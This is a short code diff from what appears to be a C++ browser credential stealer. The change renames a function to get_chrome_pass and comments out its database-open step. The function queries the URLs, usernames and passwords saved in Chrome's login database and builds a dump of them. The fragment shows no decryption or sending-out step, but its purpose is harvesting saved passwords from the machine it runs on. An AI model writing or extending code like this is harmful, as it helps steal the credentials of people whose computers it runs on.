@@ -1,9 +1,9 @@
 #include "tools.h"
 
-std::stringstream get_pass(sqlite3* db)
+std::stringstream get_chrome_pass(sqlite3* db)
 {
+    /*
     int rc;
-    rc = sqlite3_open(chrome_db_path.c_str(), &db);
 
     if( rc )
     {
@@ -11,12 +11,12 @@ std::stringstream get_pass(sqlite3* db)
         sqlite3_close(db);
         return std::stringstream();
     }
-
+    */
     std::string sql = "SELECT action_url, username_value, password_value FROM logins";
-    int rc;
+
     std::stringstream dump(std::string(""));
     sqlite3_stmt *pStmt;
-
+    int rc;
     rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
     if (rc != SQLITE_OK)
     {
